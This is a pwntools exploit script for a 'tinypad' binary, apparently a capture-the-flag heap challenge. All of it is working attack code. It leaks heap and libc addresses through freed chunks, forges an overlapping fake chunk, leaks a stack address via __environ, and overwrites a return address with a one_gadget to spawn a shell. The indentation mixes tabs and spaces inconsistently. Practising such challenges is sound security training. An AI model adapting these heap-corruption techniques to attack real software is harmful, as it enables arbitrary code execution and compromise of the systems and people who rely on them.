from pwn import *
# free b *0x400aab
# edit b *0x400e17
	
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def lover():
	gdb.attach(p,'''
	b *0x400b55
	x/40xg 0x602040
	''')
def add(size,content):
	p.readuntil("(CMD)>>> ")
	p.sendline("A")
	p.readuntil("(SIZE)>>> ")
	p.sendline(str(size))
	p.readuntil("(CONTENT)>>> ")
	p.sendline(content)
def remove(id):
	p.readuntil("(CMD)>>> ")
        p.sendline("D")
	p.readuntil("(INDEX)>>> ")
	p.sendline(str(id))
def edit(id,content):
	p.readuntil("(CMD)>>> ")
        p.sendline("E")
        p.readuntil("(INDEX)>>> ")
        p.sendline(str(id))
	p.readuntil("(CONTENT)>>> ")
        p.sendline(content)
	p.readuntil("(Y/n)>>> ")
	p.sendline("Y")
def leak():
	add(232,"AAAA");
	add(248,"B"*248);
	add(256,"CCCC");
	add(256,"DDDD");
	#there is a trick 
	#do not make the chunk_size /16 %2 ==0
	#for that we can print it (no /x00)
	remove(3);
	remove(1);
	p.readuntil("CONTENT: ")
	heap=p.readline()
	heap=(u32(heap.rstrip().ljust(4,"\x00")))-0x1f0
	p.readuntil("CONTENT: ")
	p.readuntil("CONTENT: ")
	baseaddr=p.readline()
	baseaddr=(u64(baseaddr.rstrip().ljust(8,"\x00")))
	libc.address=baseaddr-0x7ffff7dd1b78+0x7ffff7a0d000
	log.info("libc:%s",hex(libc.address))
	return heap
one_gadget=0x45216
context.log_level="debug"
p=process("./tinypad")
heap=leak()
log.info("heap:%s",hex(heap))

pre_size=heap+0xf0-0x602040
add(232,"A"*224+p64(pre_size))
remove(4)
payload = p64(0x100) + p64(pre_size)+p64(0x602040)*4
#why 4?
edit(2,payload)
remove(2)

add((256-0x20),"A"*(256-0x20))
payload=p64(0xf0)+p64(libc.symbols['__environ'])
payload+=p64(0xf0)+p64(0x602148)
#lover()
add(256,payload)
p.readuntil("CONTENT: ")
stack=p.readline()
stack=(u64(stack.rstrip().ljust(8,"\x00")))
log.info("stack:%s",hex(stack))
ret_addr=stack-0x7fffffffde38+0x7fffffffdd48
log.info("ret:%s",hex(ret_addr))
edit(2,p64(ret_addr))
edit(1,p64(one_gadget+libc.address))
p.readuntil("(CMD)>>>")
p.sendline("Q")
p.interactive()
